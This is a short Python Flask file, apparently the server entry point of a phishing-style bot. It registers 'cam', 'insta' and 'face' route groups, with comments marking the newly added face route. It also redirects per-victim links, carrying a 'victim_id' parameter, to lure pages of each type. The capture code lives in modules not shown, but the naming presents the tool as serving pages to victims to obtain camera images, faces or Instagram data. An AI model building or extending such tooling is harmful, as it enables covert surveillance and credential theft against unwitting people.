from flask import Flask, redirect, request
from bot.servers import register_cam_routes, register_insta_routes, register_face_routes  # <-- ADD

app = Flask(__name__)

register_cam_routes(app)
register_insta_routes(app)
register_face_routes(app)  # <-- ADD

@app.route('/')
def home():
    return "✅ Bot is running!"

@app.route('/p/<uid>')
def legacy_page(uid):
    target_type = request.args.get('type', 'cam')
    victim_id = request.args.get('v', 'unknown')
    if target_type == 'cam':
        return redirect(f"/p/cam/{uid}?v={victim_id}")
    elif target_type == 'ig':
        return redirect(f"/p/ig/{uid}?v={victim_id}")
    elif target_type == 'face':  # <-- ADD
        return redirect(f"/p/face/{uid}?v={victim_id}")
    return "Page not found", 404
